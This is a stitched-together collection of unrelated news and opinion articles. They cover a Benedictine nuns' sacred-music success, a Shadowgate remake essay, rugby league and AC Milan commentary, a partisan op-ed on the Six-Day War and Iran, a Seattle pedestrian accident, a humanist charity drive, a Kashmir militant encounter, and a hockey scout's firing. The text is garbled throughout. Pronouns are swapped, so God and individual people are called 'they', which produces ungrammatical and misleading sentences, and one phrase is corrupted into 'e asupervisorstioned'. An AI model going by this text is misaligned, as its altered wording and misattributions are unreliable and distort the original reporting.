Monastic Life At The Top Of The Charts

When the sisters of Benedictines of Mary, Queen of the Apostles aren't hard at work on the monastery grounds, they're topping the charts with albums of sacred music. The group's Angels and Saints at Ephesus topped the Billboard classical charts, and now it's releasing its latest, Lent at Ephesus. Mother Cecilia, prioress of the abbey in rural Missouri and the group's arranger, tells NPR's Renee Montagne, "We're not fabricating anything; this is just music we're pulling from our life, our everyday life."
"We're hard workers," Mother Cecilia says. "We really follow the rules of St. Benedict very closely — their ora et labora, which is 'pray and work.' And we have a small farm. We have a cow to milk twice a day, rain or shine, whether it's 100 degrees or 20 below. And then, of course, the processing of the milk; we make all sorts of dairy products for our table. And, of course, the recreation and our meal times fill up the day."
Mother Cecilia, 10 years prior, played French horn with the Columbus Symphony.
"God's ways are very mysterious, aren't they?" Mother Cecilia asks. "The poet Francis Thompson has termed God 'The Hound of Heaven' in one of their famous poems, and that's the best way I can describe how they were just after me my whole life, since I was a young girl. And for many years, I didn't even really want to think about it or face it, and I think it came out of dormancy with a couple of very profound episodes. One was my exposure to sacred music. ... It just lifted my spirit to God, and made me think on eternal things, up out of the petty things of life."
The success of the album, the profits from which will be used to pay off the abbey's debt and aid in expanding the monastery grounds, has not distracted the sisters from their ora et labora.
"The CDs are something that God has allowed to happen," Mother Cecilia says. "It's a wonderful thing insofar as it brings souls closer to God, and in the meantime helps us pay our debt, but other than that, life just flows along at the priory just the same way it did before. And that's the way we love it; that's the way we want. No tours, no concerts, you know? Just simple monastic life."

Old games. They keep coming back, don't they? Here's another one, clawing its way up through the damp graveyard soil, grasping for new life. Shadowgate is a 1980s point-and-click adventure, being remade by its original authors. It looks like a good thing, a game that merits existence.
“ Here's another old game, clawing its way up through the damp graveyard soil, grasping for new life.
But there are bigger questions. Are we experiencing one of those nostalgia frenzies that sweeps through gaming every now and again? Or is re-invention of the past an integral part of gaming's present?
There's that famous phrase. "The past is a foreign country: they do things differently there."
This melancholy opening line has become a good deal better-known than the novel that followed. In The Go-Between, an elderly man in mid-20th Century Britain looks back at childhood events from 1900. The world they nostalgically recall shows little resemblance to the one they live in now, and yet its legacies are inescapable.
The Go-Between is set in an idyllic high summer, but it's a dark tale that explores the idea that we are not who we were. Our past isn't merely a different place, it's inhabited by a different person.
In gaming terms, the past is everywhere, nostalgia is experiencing a boom, aided by digital distribution and crowd-funding. It's an emotional phenomenon, a fad, one that's worth exploring.
Alas, it's one that may falter as each of us comes to the understanding that playing a HD Kickstarted remake of some decades-old game is somehow missing a critical element; that being the person who so enjoyed the original, your former self, now gone.
This is not a universal law. Many games are endlessly playable in their own right, mostly those that have continued to be played down the years, that have never really left us. In 1983, I played Defender every single day, and I have played it at least once a year since then. It is not a dusty article of nostalgia to me, but a living piece of my rolling present. (By the way, I get a little worse at it, every year.)
Leaving aside period-enthusiasts (they are entitled to their fancies, and I make no criticism of them), we might all be able to name a few dozen old games that we'd happily play today, because they stand the test of time. But gaming has produced countless thousands of games that were enjoyed in their day, and that probably deserve to remain there.
In 1985, I played a hundred of hours of a Sinclair Spectrum game called Spitfire 40. I loved that game, but have not seen or played it in more than 25 years. To pick up Spitfire 40 today, to even examine it on YouTube, would be to damage a cherished memory. It's not merely that I have played a few dozen flight sims since then, all better, all that they have progressively improved the genre to an almost infinite degree, it's that the 15-year-old me who owned a Speccy in 1985, and the world that I inhabited, is too far distant to make an emotional connection through that particular experience, or, in fact, through almost any medium, save the odd song or smell or photograph.
And so the endlessly crashing waves of nostalgia leave me unmoved, faintly perplexed. My 12-year-old niece posts Tweets about TV shows they watched when they “was a kid”. Twenty-year-olds infest sub-Reddits with images of mistily-recalled games and toys from the Proterozoic era of 2003. Kickstarter is besieged by developers menacing us with threatened remakes of mediocre mid-1990s RTSes. If the past is a foreign country, it's a destination that other travellers seem to enjoy a lot more than I do.
I turn to Dave Marsh for some answers. They have been making games since the 1980s and has been, as they say, around the block, covering everything from their own hit games to online MMOs and cartoon platformers.
Their most famous work is e asupervisorstioned Shadowgate, a 1987 dungeon-adventure in which the player interacted with on-screen images (a chest, a door, a pile of bones) and either died (most probable outcome) or progressed. The game was wittily written, artfully painted and well-liked. Although launched for Mac, it enjoyed its greatest success on NES. YouTube vids of Shadowgate have garnered tens of thousands of views and many warm comments of the 'oh, man, I loved this game back in the day' variety.
Marsh and partners have launched a Kickstarter to remake the game for PC, possibly tablet, and perhaps even console, for the 21st Century. Point-and-click adventuring, games from the past, well-regarded developers exploring an entrepreneurial outlet, these are all meat, potatoes and gravy to Kickstarter.
Marsh understands that the final game they produce will need to appeal to people who played the original, overwhelmingly the guys stumping up the cash. And this is exactly why they know that the very last thing they want to do is remake the exact same game.
To do so, would be to disappoint their audience. They may understand this, or they may not. It makes no difference. As the game's creator, they appreciate the subtleties of the term “remake”.
They say, “The first thing we had to figure out was whether or not players are interested in playing a game that was something they loved in their childhood, whether or not it holds up today. A lot of the things you remember from your childhood are about where you were, how it felt in that place in your life. It's very difficult to recreate that, so we decided we just wouldn't try.”
“ A lot of the things you remember from your childhood are about how it felt in that place in your life.
They add, “We asked ourselves, ‘Are we going to make an exact port of the game? Or are we going to change the majority of the puzzles, but keep some of those iconic locations that people remember?' We went with the latter, because if somebody really wants to play Shadowgate on the NES, they can find an emulated version out there. But just re-creating exactly what they saw before didn't seem very fun to us.”
So the new Shadowgate cannot afford to rely on the dated puzzles of the 1980s and early 1990s, even though they seemed fine at the time. Too much has changed. The player's sense of power within the world is too important to be left in the past. Players today just don't want to progress through worlds on a trial-by-error basis. They want to feel like they're smart, like they are in control and no amount of nostalgia is going to change that.
The puzzles have advanced but they do not fall into line with what we think of in modern gaming as ‘puzzles', that being collecting things and arranging them in a certain order. Marsh explains, “There are plenty of games out there, where you go into a location and you play a game of Concentration or some hidden object game and you open the door. That doesn't interest us. We're more interested in story puzzles. We've been spending more time saying, 'If we were to have an area here that requires that you come in, and there's water filling the room, how would we get by that?' What would we do? What is a logical puzzle that we could create that doesn't require you to put together ten stones, or whatever.
“For the most part, we just look at it and say, 'What's a logical progression?' What can we do that feels like it's pulling from the storyline, rather than some abstract thing that you could do on Pogo? The word ‘puzzle' now comes across as something that you put together with blocks. I guess we're just saying that it's more of a storyline puzzle.”
So the idea of ‘puzzles' has changed, But what remains is the sense of place, the locations, the characters, the art-style and the writing because even if they are not wholly timeless, they have a forgiving quality of timelessness.
They explain, “It still needs to fit well with what players remember Shadowgate being. That's always a thing you have to be careful about. If I tried to turn Shadowgate into a third-person RPG, people would say, ‘this isn't what I remember.'”
“ We want to go for an art style that has a more painterly feel.
Marsh and team looked at the possibility of rendering environments in a more three-dimensional fashion, but decided to go with a look that chimed with the original, even if it makes use of the advantages of modern computing.
“It's the same in that you walk into a room, you solve the puzzle, and then you walk into the next room. We didn't want to deviate a lot from that. We like that feeling of being able to solve something in the room without worrying about whether we were positioning the camera correctly and looking exactly in the right corner. We want to go for an art style that has a more painterly feel.”
We have reached a point in gaming where graphical fidelity to the real world, even in games that portray three-dimensional spaces involving corridors and cauldrons and dragons, does not need to aspire to absolute ‘realism' in order to quality for serious consideration. Gaming is a broad creative idea.
It's curious that when Shadowgate first came out, games did not represent the world as well as, say, color illustrations in a book. So Shadowgate's blocky-looks were state of the art, then. Now games are amazing at rendering complexity. And yet we find room for art that does not aspire to complexity for its own sake, because it is pleasurable. Shadowgate seeks to flourish in the modern world, not by looking like a 25-year-old game, or like a brand-new game, but by looking like itself, by standing outside the confines of technological progress.
“ In the 1980s, adventure games were, literally, stories. How strange this feels to us today.
And finally there's the writing. If you look at a gameplay video from the original, you'll be struck by just how many words are in the game, and how strange this feels to us today. In the 1980s, adventure games were, literally, stories. Narratives and consequences were delivered in words. Again, a modern audience won't suffer to sit through text unspooling endlessly on screen and so more use will be made of voice-overs. But also, there is room for games that embrace words and text and don't treat them as if they were nasty glyphs from the imagination of a child.
Marsh says, “Not everything has to be about sound bites and instant gratification. Many people want to go ahead and enjoy an intelligent game, something where you invest your time in the story, instead of just launching a bird at some pigs. Certainly there are games that are really fun to play for a brief amount of time, but we are more interested in saying, ‘How can we expand the narrative?'
“Some people aren't really willing to invest that much time, but I think there are people who are interested in getting to the prose and understanding it and building a richer environment – or, in the case of Shadowgate and these types of adventure games, a richer game – by having a little bit more text. A lot of players care about understanding what the world is like.”
There is clearly some enthusiasm for bringing back this game. Shadowgate is currently more than mid-way towards its Kickstarter goal of $120,000. And yet, the Shadowgate of 1987 remains back there, a memory for many of its fans and an inspiration for this new game that seeks to progress the idea of adventures, rather than encase point-and-clicking in the glass cabinet of nostalgia.

"I don't want to get into a slanging match here but it was pretty disrespectful. I think that just typifies what their team is about," Thurston said. "While Smith is sitting at the top of the tree for the amount of games that he's played, the respect that they deserve ... I thought it was disrespectful what they did. But they got the result in the end and probably didn't deem it disrespectful just to walk off while they were still saying their speech." Maroons captain Cameron Smith thanks fans after winning the series. Credit:Getty Images Asked if they noticed the Blues players walk away, Smith said: "I did." Pressed for their reaction, Smith mused: "It's something our team wouldn't do. I'll decide tomorrow [what I think], I'll have a look at it." Walters was a little more expansive on the matter after a spiteful match that was dominated by NSW's allegation that Queensland were "bad winners", mainly sparked by prop Josh McGuire's social media jibe that "losers have meetings, winners have parties" in the wake of Origin II. "I didn't know that happened," Walters said. "It's extremely disrespectful, I would have thought." The Blues' official Twitter account posted a sledge aimed at McGuire suggesting Queensland ought to "have a meeting" after the Origin III loss. It was quickly deleted.
Retiring NSW skipper Gallen hosed down the issue of ignoring Smith in their post-match press conference. "I didn't even notice [we walked away]," they said. "We did what we had to do and then thanked the fans." The deleted tweet: The NSWRL has been criticised for this post sent out soon after the Blues beat Queensland in game three. Credit:Twitter The match was not short of controversy with Queensland halfback Cooper Cronk sent to the sin bin for grabbing at Wade Graham as they chased down a James Maloney kick, part of a 12-3 caning the visitors copped in the penalty count. But that incident was nothing compared to Andrew Fifita's brain snap, charging at a Queensland huddle after Gavin Cooper's touchdown to take exception with the try-scorer flinging the ball at Matt Moylan's head. They were sin binned, but NSW kept their line intact. "It's another sign of what their team is about," Thurston said.
NSW coach Laurie Daley said their reaction to Fifita's moment of madness "was for another day", but Smith was much more forthcoming on the NRL Bunker's interpretation of Michael Jennings' involvement in the lead-up to Fifita's second-half try. Jennings appeared in front of Graham as they stabbed the ball through and failed to retreat, but was not involved in Fifita scoring despite being within the 10 metres of the try. "That wasn't the referee's decision though – that came from the bunker – and I understand that," said Smith, who was awarded the Wally Lewis Medal as player of the series. "At the end of the day there's human beings controlling these decisions and they're going to make errors. We've got to get that ruling right. "I'm a bit different to Kev as I was on the field and I could see how much effort the boys were putting in. For something like that happen ... it's hard to take. [But] we had our chance to win that game with a minute to go." Loading
Daley said the rules had been "relaxed" in regards to passive offside players, but it didn't appease Smith, who said the refereeing controversy didn't diminish their side's win. "Not at all ... it didn't take any gloss off at all," Smith said. "We're obviously disappointed we lost the game tonight and we wanted to make it a memorable night for a few guys. We finish this season as the series champions and 10 out of 11 is a pretty good result."
Amidst the commotion surrounding Milan's transfer season this summer, few have stopped to consider the potential impacts of last year's fringe players. Talk of Marko Pjaca, Matteo Musacchio, and the Chinese consortium purchase of the club have pushed the likes of Andrea Poli, Jose Mauri, and Luiz Adriano to the side. These players, through little fault of their own, have been discarded just as easily as they were benched by Brocchi and Mihajlovic throughout the recently concluded campaign.
Some of the peripheral members, through poor attitude or sub par performances, were justifiably relegated to the bench. However, it is a mistake to group every underutilised squad member into the “bad player” bucket. Some, like Luiz Adriano, were simply not given enough of a chance to make their mark, and if given opportunities next season, could repay the manager's faith with fantastic performances.
Luiz Adriano's purchase was odd from the start. Signed for €9 million from Ukrainian giants Shakhtar Donetsk, Milan had the option of waiting until the winter to sign them on a Bosman, but chose to instead bring the Brazilian six months earlier for a fee. They were always going to be overshadowed by the mega-transfer of Carlos Bacca from Sevilla, but was nonetheless expected to be at worst a solid squad player.
They brought attention to themselves after stellar 2014/15 Champions League campaign with Shakhtar Donetsk, in which they scored nine goals in seven matches before being eliminated with their club by Bayern Munich in the Round of 16. In the Ukrainian Premier League they were a consistently solid player, and had a total of 128 goals and 26 assists for Shakhtar when they departed in the summer of 2015.
Adriano started their cardinal Milan season with seven starts in the club's first eight matches. They were man of the match in the club's 2-1 victory over Empoli on matchday 2, but was too often overshadowed and pressured to provide for the “star” man Bacca. As a result, they frequently missed out on scoring chances in favor of trying to set their strike partner up instead. As they changed their style into that of a supporting striker, their output in front of goal faltered, as did the regularity of their starts. They lined up at kickoff for seven of their first eight, but just two of their next ten. An injury in January only served to set the forward back, and in the winter transfer window they were nearly shipped out to China just six months after committing their future to the Rossoneri.
A short-lived return in April was shortly followed by another two-week injury absence, and though Adriano featured regularly in the final stretch of the campaign, they were irreversibly out of form after the injuries and could not contribute much to the spiralling train wreck of Milan's final two months. Now, with the return of Niang from injury and the purchase of Pescara striker Gianluca Lapadula for €10 million, it seems as if the Brazilian's time at the San Siro is best measured in days.
Selling Adriano, as counterintuitive as it may seem at first, would not be Milan's best move. With a nearly guaranteed selling of Carlos Bacca to the Premier League, new manager Vincenzo Montella would be getting rid of a player that doesn't suit their style and allowing for the club's other striker to step out of the Colombian's shadow. Adriano in particular is the type forward that Montella would prefer best up front. Good technique, mobile, and ready to drop back to support just as much as they are poised to make slaloming runs into the box. In the 29-year-old's match-winning performances against Empoli early in the season, they moved all around the pitch, never staying in one spot for too long and constantly looking for space to move into. This intelligence off the ball led to them being able to grab both an assist and the match winning goal.
Looking at raw statistical data, Adriano is the club's most creative forward. They averaged 1.05 Key Passes and 1.28 Created Chances per 90 minutes over the course of the season [per Squawka], a tally made all the more impressive considering over half of their 26 appearances were substitutions. They averaged less than 46 minutes per match, and yet was one of the club's most stimulating strikers. Whenever they were given the chance to start, Adriano was at the bare minimum solid, something that cannot be said for Carlos Bacca, who vanished for weeks on end several times throughout the season.
Adriano could forge a very solid partnership with Lapadula next season in the event that Carlos Bacca does depart, and a big name striker is not brought in to replace him. Both forwards need a partner to play off of, and therefore would compliment each other perfectly. If one of the countless rumours linking the club to a creative midfield does come true, the duo would also have service from the midfield to make their lives much easier.
Adriano has not been given enough time to prove their worth at Milan, and shipping them away would be mistaken. They have shown that they have plenty to offer if their talent is taken seriously, and with their playing style suiting Montella's ideas, the Brazilian has all the tools to become Milan's powerhouse striker new season. Be on the lookout for the South American; they may very well surprise you.

Exclusive: America's neocons continue to beat the drums for war with Iran, brushing aside warnings even from Israeli intelligence veterans. Another part of the propaganda is to merge a future war against Iran with the heroic memories of the Six-Day War nearly 45 years ago, as ex-CIA analyst Ray McGovern notes.
By Ray McGovern
With the 45th anniversary of the Six-Day War of June 1967 coming early next month, pro-Israel pundits like syndicated columnist Charles Krauthammer are again promoting Israel's faux-narrative on the reasons behind Israel's decision to attack its neighbors.
The Krauthammers of our domesticated, corporate media seem bent on waging pre-emptive war against an accurate historical rendering of the actual objectives behind that Israeli offensive that overwhelmed Arab armies and seized large swaths of Arab territory, land that hard-line Zionists refer to as “Greater Israel,” i.e. rightly theirs.
With its surprise attacks on June 5, 1967, Israel rapidly defeated the armies of its Arab neighbors. It gained control of the Gaza Strip and the Sinai Peninsula from Egypt, the West Bank and East Jerusalem from Jordan, and the Golan Heights from Syria.
The Sinai was returned to Egypt in 1979 as a result of the Camp David peace accord, a land-for-peace swap that U.S. President Jimmy Carter demanded and that then-Israeli Prime Minister Menachem Begin deeply resented.
Jewish settlement has proceeded apace on other territories conquered in the Six-Day War, particularly in the Palestinian West Bank, which Israel's ruling Likud Party refers to by its Biblical names Judea and Samaria.
Likud's charter declares that “the Jewish communities in Judea, Samaria and Gaza are the realization of Zionist values. Settlement of the land is a clear expression of the unassailable right of the Jewish people to the Land of Israel. The Likud will continue to strengthen and develop these communities and will prevent their uprooting.”
In other words, in the Six-Day War, Israel seized land that hard-line Zionists consider to be part of their ancestral legacy. The surprise attack in 1967 was the means to that end. The Likud Party emerged several years later with the explicit intent of consolidating that control through a settlement policy called “changing the facts on the ground.”
Time to Worry
Yet, despite Israel's continued expansion into those Palestinian lands, pro-Israel pundits are in a defensive mood these days, and with good reason. They see a particular need this year to whitewash Israel's surprise attack on its Arab neighbors 45 years ago not only because the anniversary is likely to draw more than the usual attention but also because Israel's strategic position has deteriorated markedly in the past year.
For instance, the 80 million-plus Egyptians are no longer neutered by the joint Mubarak-Israel-U.S. effort to repress them and co-opt them into passivity vis-Ã -vis the Palestinians. Serious contenders in the upcoming Egyptian election have said they would reconsider the Egypt-Israel Treaty of 1979.
Some leading Egyptian politicians have added that they would fling wide open Egypt's border with Gaza, where about 1.5 million Palestinians live in what amounts to an open-air prison. These Egyptians also are saying strongly sympathetic things about the widespread suffering in Gaza and the West Bank.
Equally important, Egypt's present government has already nullified the sweetheart arrangement under which Egypt was providing natural gas to Israel at bargain basement prices. (That alone is a very big deal.)
And, in sad contrast to the deafening silence of senior American officials regarding Israel's reckless killing of U.S. citizens, such as Rachel Corrie in 2003, Turkish Prime Minister Recep Tayyip Erdoğan continues to demand an apology for Israel's killing of Turkish citizens aboard the Mavi Marmara on May 31, 2010.
The result of that dispute is a sharp diminution in what used to be very close military ties between Turkey and Israel, not to mention a lot of ill will, which can be very corrosive over the longer run.
Misinformed Americans
Regarding the events of 1967, America's pro-Israel pundit class knows only too well that Egyptians, Turks, Syrians, Jordanians and other audiences in the Middle East will not buy Israel's faux-history of the Six-Day War, many having been on the receiving end of it.
Thus, it is abundantly clear that the primary targets of the disinformation are Americans like those who subscribe to the neoconservative Washington Post, whose editors in recent decades have been careful to keep their readers malnourished on the thin gruel of watered-down (or unreliable) facts about the Middle East (think, Iraq's WMDs).
So, it would be simply too much to acknowledge, as former Israeli Prime Minister Begin did 30 years ago, in an uncommon burst of hubris-tinged honesty, that Israel's attack on its neighbors in 1967 was in no way a defensive war, or even a “pre-emptive” war (there being no really dangerous Egyptian or other threat to pre-empt).
While Prime Minister in 1982, Begin declared: “In June 1967, we had a choice. The Egyptian Army concentrations in the Sinai approaches (did) not prove that Nasser was really about to attack us. We must be honest with ourselves. We decided to attack him.”
Such real history would lift the veil now shrouding Israel's version that plays up the “threat” posed by Egypt and disguises the grand enterprise to expand Israel's borders and, in double-contravention of international law, to colonize the occupied territories.
To bolster Israel's heroic rendition of the Six-Day War and to apply its supposed lessons to Israel's current plans to bomb Iran Krauthammer reprised that triumphal version of Israel masterfully defending itself against imminent destruction by the Arabs.
“On June 5 (1967), Israel launched a preemptive strike on the Egyptian air force, then proceeded to lightning victories on three fronts,” Krauthammer wrote, cooing: “The Six-Day War is legend.”
They then overlaid that gauzy history onto today's confrontation with Iran: “Israelis today face the greatest threat to their existence, nuclear weapons in the hands of apocalyptic mullahs publicly pledged to Israel's annihilation, since May '67. The world is again telling Israelis to do nothing as it looks for a way out. But if such a way is not found, as in '67, Israelis know that they will once again have to defend themselves, by themselves.”
Noting Prime Minister Benjamin Netanyahu's recent coalition with the rival Kadima Party, Krauthammer also mocked the importance of former Israeli intelligence chiefs cautioning against a rush to war with Iran.
They wrote: “So much for the recent media hype about some great domestic resistance to Netanyahu's hard line on Iran. Two notable retired intelligence figures were widely covered here for coming out against him. Little noted was that one had been passed over by Netanyahu to be the head of Mossad, while the other had been fired by Netanyahu as Mossad chief (hence the job opening).
“The [new] wall-to-wall coalition demonstrates Israel's political readiness to attack, if necessary. (Its military readiness is not in doubt.) Those counseling Israeli submission, resignation or just endless patience can no longer dismiss Israel's tough stance as the work of irredeemable right-wingers.”
After reading this Krauthammer op-ed in the May 10 Washington Post, I decided, against my better judgment, to invest a half-hour writing a letter to the editor, trying to make it as factual as possible. Several days after its submission, I have given up any meager hope I may have harbored that the Post would actually print it.
Perhaps that half-hour investment will not have been a complete waste of time if I can share the result with you:
Letter to the Editor, Washington Post, May 13, 2012
In their May 10 op-ed column, “Echoes of '67: Israel unites,” Charles Krauthammer refers to May 1967 as “Israel's most fearful, desperate month” and compares it to today, claiming that Iran poses “the greatest threat” to Israel's existence.
It ain't necessarily so. In August 1982, then-Prime Minister Menachem Begin admitted publicly: “In June 1967, we had a choice. The Egyptian Army concentrations in the Sinai approaches (did) not prove that Nasser was really about to attack us. We must be honest with ourselves. We decided to attack him.”
Today's “threat” from Iran is equally ephemeral. Krauthammer, though, warns ominously about “nuclear weapons in the hands of apocalyptic mullahs publicly pledged to Israel's annihilation.”
The allusion is to an illusion, the alleged threat by Iranian President Ahmadinejad to “wipe Israel off the map.” But they never said that, an inconvenient reality reluctantly acknowledged by Israeli Deputy Prime Minister Dan Meridor early last month. And in January, Defense Secretary Leon Panetta and their Israeli counterpart both publicly affirmed the unanimous assessment of U.S. intelligence that Iran is not working on a nuclear weapon.
Who, then, is being apocalyptic? Krauthammer's agenda is so transparent that a rigorous Fact Check should be de rigueur.

UPDATE 8:45 a.m.:
A 49-year-old man was hospitalized this morning after being struck by a car in the Denny Triangle neighborhood.
Seattle Fire Department spokesperson Kyle Moore said the man was thrown 20 feet after being struck by a car; witnesses performed CPR until medics arrived. The man was taken to Harborview Medical Center with life-threatening injuries, Moore said.
Seattle police are investigating.
ORIGINAL STORY: Seattle police have closed Boren Avenue at Virginia Street in the Denny Triangle neighborhood for a car vs pedestrian accident at about 6:40 a.m. that may turn a windy and rainy morning commute into a deadly one.
Emergency crews are on the scene.
Witnesses told KOMO News that the pedestrian flew through the air and smacked into a light pole on the sidewalk after they were hit. They fell to the sidewalk and appeared to be unconscious.
The driver remained at the scene and is cooperating with the investigation, KOMO reported.
There is a stigma that non-religious people are selfish, immoral, and do not volunteer. This is probably due to several reasons, but one could be that non-religious people may donate individually and do not have a church associated with them. Churches provide strong social networks and those social ties greatly increase the likelihood that one will give to charity. Sequentially, larger charity efforts allow for more people to become aware of the work being done. The non-religious community is growing, but is still quite small and loosely connected. However, secular humanists have been known come together and help out during tragedies. I recently had the experience of organizing one of these successful humanist charity campaigns.
A horrific tragedy occurred in Charleston, South Carolina on Wednesday, June 17th 2015. Dylan Roof went into the Emanuel African Methodist Episcopal Church and killed nine people. Roof is deeply racist and committed this act of domestic terrorism in hopes of starting a “race war.” This gruesome act is an example of how racism and intolerance are still major problems for our country. Humanists condemn racism and intolerance and we wanted to help out those who suffered from this tragedy.
Directly after hearing the news, people in the South Carolina Facebook groups I'm involved with were discussing how we could help. Amy Monsky and I decided that a great way to help out would be to create an online campaign to support the families of the victims involved in the attack. This campaign was organized and spread by humanist groups, but anyone could donate. In just three days this campaign was shared thousands of times and raised over $12,000 from over 300 donations.
It might seem counterintuitive that a campaign organized by secular humanists to help religious people would be so successful. However, my response to that is simple: as humanists we aim to help out when people are in need. It doesn't matter who the people are or what their religious beliefs are. The money is being donated through the Mother Emanuel Hope Fund, which helps the families pay for funeral costs, burial costs, counseling, and other expenses as some of the people killed were providing for their families. Even if some of the money finds its way back to the church, I don't think humanists should be concerned with that. The church is part of a community that suffered a horrible event. Even if we are not religious, we should be happy to help their community heal.
I found this experience quite encouraging as I was overwhelmed with the prompt and enthusiastic support we received. It was beautiful to see the non-religious community put their differences aside and help out those in need. It was also great to see so many non-religious people condemn these actions of racism and hatred. As the humanist community grows and becomes more connected, it will continue to help out during catastrophes. Having an established network definitely facilitates being able to help and that is something we can learn from our religious neighbors.

Srinagar: Burhan Wani's successor Sabzar Ahmad Bhat fled from the encounter site at Tral in South Kashmir on Sunday taking the cover of the darkness and heavy stone-pelting in the area, top police officials said.
The top Hizbul Mujahideen commander took over as the operational chief of the militant organisation in Kashmir after Burhan's death in July.
Sources said that the police had specific information about Sabzar's presence in the area, but they managed to flee from the spot. After the encounter concluded on Sunday morning, local people resorted to heavy stone-pelting. They also snatched the weapon of one of the CRPF personnel near the Tral bus stand that lies in close vicinity of the house of Burhan.
Director General of police, SP Vaid, said that two militants have been killed in the operation that lasted through the night. They identified one of the militants as Aquib Moulvi, a resident of Tral and another one as a Pakistani militant.
Vaid said that Aquib was an A++ category militant and the security forces were looking for them for a long time. They reiterated that the forces had specific information about Sabzar's presence in the area while describing the killing of Aquib as a major achievement for the security forces. “Aquib was very important for us. It is a big achievement for the police.  They are a local militant whereas Osama is from Pakistan. Aquib was involved in many militancy incidents." About the Pakistani militant, a police official said that they are mostly identified by their code names as the exact identities can't be ascertained.
"The house in which the militants remained holed in was their hideout," Vaid said adding that the police has arrested the house owner as well.
One police official died during the operation while some security personnel including an Indian Army major were injured. "One of our police constables received a bullet injury in the leg whereas an army major was hit in the jaw," Vaid said, adding that the forces, however, maintained a maximum restraint to avoid civilian causalities.
There are reports that the local people continued with the protests even after the incident, and security has been beefed up around the area following the encounter. A senior police official said that Sabzar, who was accompanied by some other militants managed to escape. "The security force personnel had encircled many of the houses, but Sabzar and other militants were holed in some other house," a top official said.
A local police official in Tral said that Aquib is from the Hayna village of restive Tral area and has been associated with Hizbul Mujahideen for over three years. They joined militancy in 2012 at the age of 20 and was a close associate of Burhan.
Vaid said that Aquib was wanted in many cases and has been on the run for a long time. According to sources Aquib was from a poor family and had been active in South Kashmir area. The encounter was carried out on a tip-off by both the Indian Army and local police at Nazneenpur, Hafoo area of Tral, and lies only few kilometres from the local police station.
Police officials said that there are many militants who remain active in Tral area as the adjoining forests provide cover as well as training ground for them. Some of the militants including Sabzar, who have snatched rifles from the forces, have been locally trained in the forest areas. During the height of pro-freedom protests in Kashmir, Tral had remained virtually out of bounds for the forces as not a single security force personnel was spotted near the house of the Burhan or the adjoining graveyard where their funeral was held.
Police officials said that though the operation in Tral was over, search will continue to trace out Sabzar and their associates. "We have started a manhunt for Sabzar and their other associates in the area," a senior police official said.
Sabzar, who also comes from the Tral area, was closely associated with Burhan. Local sources said that like Sabzar many other militants have also been visiting their family members. According to sources, Burhan visited their family members many times before they were killed in an encounter in 2016 at Kokernag area of South Kashmir. Their death triggered fierce protests across Kashmir resulting into the loss of over 70 lives.

Over the weekend it was announced that the Avalanche had decided to part ways with long time head of amateur scouting Rick Pracey. Some would find this news somewhat interesting as it appears on paper, that they had done quite a decent job at finding young players to turn around a bottom of the league team. But if you dive into the actual work they have done, they come out looking like a paper tiger and the Avalanche parting ways with them isn't as shocking as it may appear
There is no denying that Pracey and their group of scouts puts together one of the best drafts, league wide, in 2009. That year they were able to grab franchise cornerstone Matt Duchene at #3 overall, Ryan O'Reilly at #33 overall, and to top it off they were also able to nab up and comer Tyson Barrie at #64, which is looking more like a steal of the draft everyday. Not to mention Pracey also picked defenseman Stefan Elliott this year, who for a long time was a highly touted prospect but has yet to put it together on the NHL level. This was a spectacular draft that started the push to get the team back to respectability.
After the 2009 draft the results were very hit and miss for Pracey and company. In 2010 Pracey decided to go “off the board” with the Avs first pick tagging Joey Hishon with their first pick. Hishon was on their way to making the NHL before a vicious hit derailed their career. Hishon is back playing but to this date has yet to play a regular season game with the team. This obliviously can't be blamed on Pracey as they have no control over a player getting injured, but unfortunately their top pick has yet to make an impact. The rest of 2010 draft is looking weaker by the day. Pracey did manage to draft two goaltenders with promise, Calvin Pickard and Sami Aittokallio, in this draft but to this date it looks like neither will amount to anything more than backup NHL goalies.
In 2011, Pracey did land team captain, Gabe Landeskog, with the 2nd overall pick, but they also had the 11th pick in that draft, which they used on defenseman Duncan Siemens who has yet to play an NHL game. By taking Siemens, Pracey passed up players like Ryan Murphy, JT Miller, Nathan Beaulieu, and Stuart Percy all of whom have made NHL contributions. The rest of the 2011 Avs draft class was terrible, with no prospects looking like they have much of a chance to even make it to the NHL.
The 2012 draft wasn't much better for Pracey. The Avs didn't have a first round pick due to the Semyon Varlamov trade, so with their first pick in the 2nd round they took over ager Mitchell Heard. Heard has been the definition of bust. Heard had been playing bottom line minutes in Lake Erie of the AHL, and recently was demoted to the Fort Wayne Comets of the ECHL. Of the rest of the players drafted in 2012, forward Troy Bourke has shown some promise as has forward Colin Smith, but both are a long way away from being NHL players. Both have big time offensive skills but they are both of small stature, which makes scouts wonder if they will ever meet the physical demands of the NHL game.
Patrick Roy and Joe Sakic were around for the 2013 draft and their presence could be felt, as there was a distinct shift in what kind of players were drafted. Nathan MacKinnon was an obvious choice at # 1 overall. But after that Roy and company put their focus on drafting larger more physical players. This was a drastic departure from what Pracey had done in the past, as they always favored smaller skill players. It's a little too early to start evaluating this draft class for quality of picks, but so far a bunch of the picks, including Chris Bigras, Mason Geertson and Will Butcher, have played very well for their junior teams and colleges.
Obviously the 2014 draft is way too young to try to evaluate, but once again the Avs went the route of larger more physical players, which is not the type of player Pracey likes to draft, and you could tell the Avs started to value their voice less and less.
Another area of concern was Pracey's lack of focus on the international prospects. Pracey very rarely drafted international players, only five players drafted out a possible 40 draft picks since 2009. Plus Pracey never looked to bring in un-drafted international players. This was concerning considering the large amount of international players playing in the NHL. It's as if Pracey just deliberately ignored a large group of potential players. Roy and Sakic came in and within a year had signed three players (Dennis Everberg who made the opening night roster, Borna Rendulic who was one of the last cuts in training camp and Maxim Noreau) who were playing internationally last season.
It's pretty clear that the Avs and Rick Pracey were no longer seeing eye to eye on what kind of players should be in the system. Rick Pracey did a great job at evaluating the top end talents selected at the top ends of drafts, but if they didn't have a high first round pick they usually swung and missed. With the new era of drafting being influenced by the type of players Roy and Sakic want, and the multiple miscues by Pracey over the past 3 years, there just was no place left for them and their firing should not be shock to anyone.

